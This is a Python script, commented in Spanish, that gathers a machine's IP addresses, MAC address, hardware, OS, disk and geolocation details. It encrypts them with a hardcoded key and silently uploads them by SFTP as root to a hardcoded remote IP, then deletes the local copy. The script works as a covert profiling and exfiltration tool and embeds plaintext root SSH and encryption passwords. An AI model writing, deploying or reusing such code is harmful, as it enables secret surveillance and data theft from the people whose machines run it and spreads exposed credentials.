#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import platform
import subprocess
import socket
import uuid
import psutil
import requests
import time
import os
import sys
import paramiko
import getpass
import base64
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional
from tqdm import tqdm
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

SYSTEM_CONFIG = {
    'timeout': 30,
    'max_retries': 3,
    'retry_delay': 5,
    'speed_test_url': 'https://www.google.com',
    'speed_test_timeout': 10
}

SSH_CONFIG = {
    'hostname': '184.107.168.100',
    'username': 'root',
    'password': '2vcA,%K6@8pJgq_b',
    'port': 22,
    'key_filename': None,
    'remote_dir': '/home/root/info'
}

ENCRYPTION_CONFIG = {
    'password': '71eRN;)w]:e%_|)9',
    'salt': b'j6Kz1Nbn8AgZKitLxV1uf4A',
    'iterations': 100000
}

class SSHFileUploader:
    def __init__(self, hostname, username, password=None, key_filename=None, port=22):
        self.hostname = hostname
        self.username = username
        self.password = password
        self.key_filename = key_filename
        self.port = port
        self.client = None
        self.sftp = None

    def connect(self):
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            connect_kwargs = {
                'hostname': self.hostname,
                'username': self.username,
                'port': self.port,
                'timeout': 30
            }

            if self.key_filename:
                if not os.path.exists(self.key_filename):
                    return False
                connect_kwargs['key_filename'] = self.key_filename
            elif self.password:
                connect_kwargs['password'] = self.password
            else:
                self.password = getpass.getpass(f"Contraseña para {self.username}@{self.hostname}: ")
                connect_kwargs['password'] = self.password

            self.client.connect(**connect_kwargs)

            self.sftp = self.client.open_sftp()
            return True

        except Exception as e:
            return False

    def disconnect(self):
        if self.sftp:
            self.sftp.close()
        if self.client:
            self.client.close()

    def _format_size(self, size_bytes):
        if size_bytes == 0:
            return "0B"
        size_names = ["B", "KB", "MB", "GB", "TB"]
        i = 0
        while size_bytes >= 1024 and i < len(size_names) - 1:
            size_bytes /= 1024.0
            i += 1
        return f"{size_bytes:.1f}{size_names[i]}"

    def _ensure_remote_directory(self, remote_dir):
        try:
            current_path = ""
            for part in remote_dir.strip('/').split('/'):
                if part:
                    current_path += f"/{part}"
                    try:
                        self.sftp.stat(current_path)
                    except FileNotFoundError:
                        self.sftp.mkdir(current_path)
        except Exception as e:
            pass

    def upload_file(self, local_file_path, remote_filename=None):
        if not remote_filename:
            remote_filename = os.path.basename(local_file_path)

        remote_path = f"{SSH_CONFIG['remote_dir']}/{remote_filename}"

        if not self.connect():
            return False

        try:
            if not os.path.exists(local_file_path):
                return False

            try:
                file_size = os.path.getsize(local_file_path)
            except Exception as e:
                return False

            self._ensure_remote_directory(SSH_CONFIG['remote_dir'])

            try:
                self.sftp.put(local_file_path, remote_path)
                return True

            except Exception as e:
                return False

        except Exception as e:
            return False
        finally:
            self.disconnect()

class DataEncryption:
    def __init__(self, password: str, salt: bytes, iterations: int = 100000):
        self.password = password.encode()
        self.salt = salt
        self.iterations = iterations
        self.fernet = None
        self._generate_key()

    def _generate_key(self):
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=self.iterations,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))
        self.fernet = Fernet(key)

    def encrypt_data(self, data: Dict[str, Any]) -> bytes:
        try:
            json_data = json.dumps(data, ensure_ascii=False, indent=2)
            encrypted_data = self.fernet.encrypt(json_data.encode('utf-8'))
            return encrypted_data
        except Exception as e:
            raise Exception(f"Error al encriptar datos: {str(e)}")

    def decrypt_data(self, encrypted_data: bytes) -> Dict[str, Any]:
        try:
            decrypted_data = self.fernet.decrypt(encrypted_data)
            return json.loads(decrypted_data.decode('utf-8'))
        except Exception as e:
            raise Exception(f"Error al desencriptar datos: {str(e)}")

    def save_encrypted_file(self, data: Dict[str, Any], filename: str) -> str:
        try:
            encrypted_data = self.encrypt_data(data)
            encrypted_filename = f"{filename}.encrypted"

            with open(encrypted_filename, 'wb') as f:
                f.write(encrypted_data)

            return encrypted_filename
        except Exception as e:
            raise Exception(f"Error al guardar archivo encriptado: {str(e)}")

def get_public_ip() -> str:
    try:
        response = requests.get('https://api.ipify.org', timeout=10)
        return response.text.strip()
    except Exception as e:
        return "No disponible"

def get_private_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        return "No disponible"

def get_mac_address() -> str:
    try:
        mac = uuid.getnode()
        return ':'.join(('%012X' % mac)[i:i+2] for i in range(0, 12, 2))
    except Exception as e:
        return "No disponible"

def test_internet_speed() -> Dict[str, Any]:
    try:
        start_time = time.time()
        response = requests.get(SYSTEM_CONFIG['speed_test_url'],
                              timeout=SYSTEM_CONFIG['speed_test_timeout'])
        end_time = time.time()

        if response.status_code == 200:
            response_time = (end_time - start_time) * 1000
            if response_time < 100:
                speed = "Muy rápida (>50 Mbps)"
            elif response_time < 300:
                speed = "Rápida (10-50 Mbps)"
            elif response_time < 1000:
                speed = "Media (5-10 Mbps)"
            else:
                speed = "Lenta (<5 Mbps)"

            return {
                "response_time_ms": round(response_time, 2),
                "estimated_speed": speed,
                "status": "success"
            }
        else:
            return {
                "response_time_ms": None,
                "estimated_speed": "Error en la conexión",
                "status": "error"
            }
    except Exception as e:
        return {
            "response_time_ms": None,
            "estimated_speed": f"Error: {str(e)}",
            "status": "error"
        }

def get_hardware_info() -> Dict[str, Any]:
    try:
        cpu_info = {
            "physical_cores": psutil.cpu_count(logical=False),
            "total_cores": psutil.cpu_count(logical=True),
            "max_frequency": psutil.cpu_freq().max if psutil.cpu_freq() else None,
            "cpu_percent": psutil.cpu_percent(interval=1)
        }

        memory = psutil.virtual_memory()
        memory_info = {
            "total_gb": round(memory.total / (1024**3), 2),
            "available_gb": round(memory.available / (1024**3), 2),
            "percent_used": memory.percent
        }

        return {
            "cpu": cpu_info,
            "memory": memory_info
        }
    except Exception as e:
        return {"error": str(e)}

def get_os_info() -> Dict[str, str]:
    try:
        return {
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
    except Exception as e:
        return {"error": str(e)}

def get_disk_info() -> Dict[str, Any]:
    try:
        disks = {}
        for partition in psutil.disk_partitions():
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disks[partition.device] = {
                    "mountpoint": partition.mountpoint,
                    "filesystem": partition.fstype,
                    "total_gb": round(partition_usage.total / (1024**3), 2),
                    "used_gb": round(partition_usage.used / (1024**3), 2),
                    "free_gb": round(partition_usage.free / (1024**3), 2),
                    "percent_used": round((partition_usage.used / partition_usage.total) * 100, 2)
                }
            except PermissionError:
                continue
        return disks
    except Exception as e:
        return {"error": str(e)}

def get_location() -> Dict[str, str]:
    try:
        response = requests.get('https://ipapi.co/json/', timeout=10)
        if response.status_code == 200:
            data = response.json()
            return {
                "country": data.get('country_name', 'No disponible'),
                "region": data.get('region', 'No disponible'),
                "city": data.get('city', 'No disponible'),
                "latitude": str(data.get('latitude', 'No disponible')),
                "longitude": str(data.get('longitude', 'No disponible'))
            }
        else:
            return {"error": "No se pudo obtener la ubicación"}
    except Exception as e:
        return {"error": f"Error obteniendo ubicación: {str(e)}"}

def collect_system_info() -> Dict[str, Any]:
    system_info = {
        "timestamp": datetime.now().isoformat(),
        "public_ip": get_public_ip(),
        "private_ip": get_private_ip(),
        "mac_address": get_mac_address(),
        "internet_speed": test_internet_speed(),
        "hardware": get_hardware_info(),
        "operating_system": get_os_info(),
        "disks": get_disk_info(),
        "location": get_location()
    }

    return system_info

def save_to_file(data: Dict[str, Any], filename: str = None) -> str:
    if filename is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"system_info_{timestamp}.json"

    try:
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return filename
    except Exception as e:
        return None

def main():
    system_info = collect_system_info()

    print(f"{system_info['public_ip']}")
    print(f"{system_info['private_ip']}")
    print(f"{system_info['internet_speed']['estimated_speed']}")

    encryption = DataEncryption(
        password=ENCRYPTION_CONFIG['password'],
        salt=ENCRYPTION_CONFIG['salt'],
        iterations=ENCRYPTION_CONFIG['iterations']
    )

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_filename = f"system_info_{timestamp}"

    try:
        encrypted_filename = encryption.save_encrypted_file(system_info, base_filename)
    except Exception as e:
        return

    uploader = SSHFileUploader(
        hostname=SSH_CONFIG['hostname'],
        username=SSH_CONFIG['username'],
        password=SSH_CONFIG['password'],
        key_filename=SSH_CONFIG['key_filename'],
        port=SSH_CONFIG['port']
    )

    uploader.upload_file(encrypted_filename)

    try:
        os.remove(encrypted_filename)
    except:
        pass

if __name__ == "__main__":
    main()